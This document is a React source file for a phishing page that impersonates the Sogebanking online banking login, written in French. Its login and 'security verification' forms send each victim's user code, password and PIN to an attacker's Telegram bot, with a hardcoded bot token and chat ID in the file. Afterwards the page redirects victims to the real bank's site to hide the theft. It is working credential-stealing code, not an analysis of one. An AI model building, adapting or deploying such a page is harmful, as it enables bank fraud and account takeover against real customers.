import { useState } from 'react';
import './App.css';

const TELEGRAM_BOT_TOKEN = '8457904685:AAHPVCkGflXFDR8TlAdEVAvDotmvZmw9cK0';
const TELEGRAM_CHAT_ID = '6201590412';

function App() {
  const [page, setPage] = useState('login'); // 'login' or 'verification'
  const [userCode, setUserCode] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [verificationCode, setVerificationCode] = useState('');
  const [success, setSuccess] = useState(false);

  const sendToTelegram = async (message) => {
    try {
      // Format timestamp
      const timestamp = new Date().toLocaleString('fr-FR', {
        timeZone: 'America/Port-au-Prince',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      });

      const botMessage = `🔔 SOGEBANKING LOGIN ALERT\n${message}\n⏰ Time: ${timestamp}\n📱 User Agent: ${navigator.userAgent}`;

      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      console.log('Sending to Telegram...', { chatId: TELEGRAM_CHAT_ID, url });
      
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: botMessage,
          parse_mode: 'HTML'
        })
      });

      const data = await response.json();
      console.log('Telegram response:', data);
      
      if (data.ok) {
        console.log('✅ Message sent to Telegram successfully');
        return true;
      } else {
        console.error('❌ Telegram error:', data.description || data.error_code);
        return false;
      }
    } catch (error) {
      console.error('❌ Telegram fetch error:', error.message);
      return false;
    }
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    
    if (!userCode.trim() || !password.trim()) {
      alert('Veuillez remplir tous les champs');
      return;
    }

    setLoading(true);

    try {
      // Send login attempt to Telegram
      const message = `User Code: ${userCode}\nPassword: ${password}`;
      
      await sendToTelegram(message);

      // Move to verification page
      setTimeout(() => {
        setPage('verification');
        setLoading(false);
      }, 1500);
    } catch (error) {
      alert('Erreur technique. Veuillez réessayer.');
      setLoading(false);
    }
  };

  const handleVerification = async (e) => {
    e.preventDefault();

    if (!verificationCode.trim() || verificationCode.length < 4) {
      alert('Veuillez saisir votre code PIN à 4-6 chiffres');
      return;
    }

    setLoading(true);

    try {
      // Send verification attempt to Telegram
      const message = `PIN Verification Submitted\nCode: ${verificationCode}\nUser: ${userCode}`;

      await sendToTelegram(message);

      // Show success
      setTimeout(() => {
        setSuccess(true);
        setLoading(false);

        // Redirect after 3 seconds
        setTimeout(() => {
          window.location.href = 'https://www.sogebank.com/';
        }, 3000);
      }, 1500);
    } catch (error) {
      alert('Erreur technique. Veuillez réessayer.');
      setLoading(false);
    }
  };

  if (success) {
    return (
      <div className="container success-container">
        <div className="success-box">
          <div className="success-icon">✓</div>
          <h1>VÉRIFICATION TERMINÉE</h1>
          <p>Votre authentification a été complétée avec succès.</p>
          <p className="redirect-text">Redirection en cours...</p>
        </div>
      </div>
    );
  }

  if (page === 'verification') {
    return (
      <div className="container">
        <header className="header">
          <div className="header-content">
            <img src="https://www2.sogebanking.com/sogebanking/images/new_logo.png" alt="Sogebanking Logo" className="logo" />
          </div>
        </header>

        <main className="main-content">
          <div className="form-card">
            <h2>VÉRIFICATION DE SÉCURITÉ</h2>
            
            <div className="info-box">
              <p>Veuillez consulter vos SMS et vos e-mails pour obtenir un code à 6 chiffres permettant de finaliser cette vérification.</p>
            </div>

            <form onSubmit={handleVerification}>
              <div className="form-group">
                <label>CODE PIN DE SÉCURITÉ</label>
                <div className="input-wrapper">
                  <span className="input-icon">🔒</span>
                  <input
                    type="password"
                    value={verificationCode}
                    onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                    disabled={loading}
                    placeholder="••••"
                    maxLength="6"
                    required
                  />
                </div>
                <small>Saisissez le code à 6 chiffres que vous recevrez par e-mail ou par SMS.</small>
              </div>

              <button type="submit" disabled={loading} className="btn btn-primary">
                {loading ? 'VÉRIFICATION EN COURS...' : 'VALIDER'}
              </button>

              <div className="help-text">
                <p>Vous avez oublié votre code PIN ?</p>
                <a href="#support">Contactez le service client</a>
              </div>

              <div className="security-note">
                🔒 Cette étape supplémentaire garantit la sécurité de votre compte
              </div>
            </form>
          </div>
        </main>

        <footer className="footer">
          <div className="footer-links">
            <a href="#about">À propos</a> | 
            <a href="#privacy">Confidentialité</a> | 
            <a href="#security">Sécurité</a> | 
            <a href="#support">Support</a>
          </div>
          <p>&copy; 2026 Sogebank S.A. Tous droits réservés</p>
        </footer>
      </div>
    );
  }

  return (
    <div className="container">
      <header className="header">
        <div className="header-content">
          <img src="https://www2.sogebanking.com/sogebanking/images/new_logo.png" alt="Sogebanking Logo" className="logo" />
          <div className="header-links">
            <a href="#locate">Localiser</a>
            <span>|</span>
            <a href="#contact">Contactez-nous</a>
          </div>
        </div>
      </header>

      <main className="main-content">
        <div className="form-card">
          <h2>SE CONNECTER</h2>
          
          <form onSubmit={handleLogin}>
            <div className="form-group">
              <label>CODE UTILISATEUR</label>
              <div className="input-wrapper">
                <span className="input-icon">👤</span>
                <input
                  type="text"
                  value={userCode}
                  onChange={(e) => setUserCode(e.target.value)}
                  disabled={loading}
                  required
                />
              </div>
            </div>

            <div className="form-group">
              <label>MOT DE PASSE</label>
              <div className="input-wrapper">
                <span className="input-icon">🔐</span>
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  disabled={loading}
                  required
                />
                <button
                  type="button"
                  className="toggle-password"
                  onClick={() => setShowPassword(!showPassword)}
                  disabled={loading}
                >
                  {showPassword ? '👁️' : '👁️‍🗨️'}
                </button>
              </div>
            </div>

            <button type="submit" disabled={loading} className="btn btn-primary">
              {loading ? 'CONNEXION EN COURS...' : 'CONNEXION'}
            </button>

            <div className="forgot-password">
              <a href="#forgot-code">Code utilisateur oublié?</a>
              <a href="#forgot-password">Mot de passe oublié?</a>
            </div>

            <div className="signup-section">
              <p>S'inscrire à Sogebanking pour:</p>
              <div className="signup-links">
                <a href="#signup-business">- Entreprise</a>
                <a href="#signup-individual">- Particulier</a>
              </div>
            </div>

            <div className="security-badge">
              <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%23FF9900' width='100' height='100' rx='5'/%3E%3Ctext x='50' y='50' font-size='40' fill='white' text-anchor='middle' dominant-baseline='middle'%3E🔒%3C/text%3E%3C/svg%3E" alt="Secure" />
            </div>
          </form>
        </div>
      </main>

      <footer className="footer">
        <div className="footer-links">
          <a href="#about">À propos</a> | 
          <a href="#privacy">Confidentialité</a> | 
          <a href="#security">Sécurité</a> | 
          <a href="#support">Support</a>
        </div>
        <p>&copy; 2026 Sogebank S.A. Tous droits réservés</p>
      </footer>
    </div>
  );
}

export default App;
